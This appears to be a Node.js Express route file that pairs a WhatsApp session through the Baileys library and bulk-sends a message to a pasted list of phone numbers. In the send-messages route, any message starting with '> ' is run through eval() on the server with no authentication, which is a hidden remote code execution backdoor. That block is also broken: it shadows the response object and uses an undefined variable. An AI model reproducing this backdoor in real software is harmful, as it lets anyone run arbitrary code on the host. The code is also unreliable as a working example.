import express from 'express';
import fs from 'fs';
import { exec } from 'child_process';
import pino from 'pino';
import {
  makeWASocket,
  useMultiFileAuthState,
  delay,
  makeCacheableSignalKeyStore,
  Browsers,
  jidNormalizedUser,
} from '@whiskeysockets/baileys';

const router = express.Router();

let client = null;
let isConnected = false;

// ====== Initialize Socket Function ======
async function initSocket(number = '') {
  const { state, saveCreds } = await useMultiFileAuthState('./session');
  client = makeWASocket({
    auth: {
      creds: state.creds,
      keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'fatal' })),
    },
    printQRInTerminal: false,
    logger: pino({ level: 'fatal' }),
    browser: Browsers.macOS('Safari'),
  });

  client.ev.on('creds.update', saveCreds);

  client.ev.on('connection.update', async (s) => {
    const { connection, lastDisconnect } = s;

    if (connection === 'open') {
      isConnected = true;
      console.log('✅ Socket connected.');
    }

    if (connection === 'close') {
      isConnected = false;
      const reason = lastDisconnect?.error?.message || '';
      console.log(`⚠ Socket disconnected: ${reason}`);

      if (!reason.includes('logged out')) {
        console.log('🔁 Reinitializing socket in 5s...');
        await delay(5000);
        initSocket(); // Rebuild socket
      }
    }
  });

  if (!client.authState.creds.registered && number) {
    await delay(1500);
    number = number.replace(/[^0-9]/g, '');
    const code = await client.requestPairingCode(number);
    console.log('🔐 Pairing Code:', code);
    return code;
  }
  return null;
}

// ====== Pairing Route ======
router.get('/', async (req, res) => {
  const number = req.query.number;
  if (!number) return res.status(400).json({ error: 'Phone number is required' });

  try {
    // If no client yet, initialize
    if (!client) {
      const code = await initSocket(number);
      if (code) return res.json({ code });
      return res.json({ message: 'Already paired' });
    }

    // Client exists, check registered
    if (!client.authState.creds.registered) {
      const code = await client.requestPairingCode(number.replace(/[^0-9]/g, ''));
      console.log('🔐 Pairing Code:', code);
      return res.json({ code });
    } else {
      return res.json({ message: 'Already paired' });
    }
  } catch (err) {
    console.error('❌ Pairing error:', err);
    return res.status(500).json({ error: 'Failed to fetch pairing code' });
  }
});

router.post('/send-messages', async (req, res) => {
    const { numbersText, message } = req.body;
    const io = req.app.get('io');
  
    if (!numbersText || !message) {
      return res.status(400).json({ error: 'Missing numbersText or message' });
    }
  
    if (!client || !isConnected) {
      return res.status(500).json({ error: 'Socket is not connected. Please pair first.' });
    }

  //eval
  if (message.startsWith('> ')) {
    var code = message.replace(/^> /, '');
    try {
        var res = await eval(code);
        io.emit('status', `Evaled: ${result}`);
        return res.json({ status: 'Evaled!', result });
    } catch (e) {
      io.emit('status', `Error: ${e}`);
      return res.status(500).json({ error: `Eval error: ${e}` });
    }
  }

    const lines = numbersText.split(/\r?\n/).map(line => line.trim()).filter(Boolean);
    const jids = lines.map(num => `${num}@s.whatsapp.net`);
  
    io.emit('status', `📤 Message sending started to ${jids.length} numbers.`);
  
    try {
      for (let jid of jids) {
        try {
          await client.sendMessage(jid, { text: message });
          io.emit('status', `✅ Message sent to ${jid}`);
        } catch (err) {
          io.emit('status', `❌ Failed to send to ${jid}: ${err.message}`);
        }
        await delay(30000);
      }
  
      io.emit('status', `✅ All messages sent successfully.`);
      return res.json({ status: 'Sending completed' });
    } catch (err) {
      io.emit('status', `❌ Sending failed: ${err.message}`);
      return res.status(500).json({ error: 'Sending error' });
    }
  });
  
  

export default router;
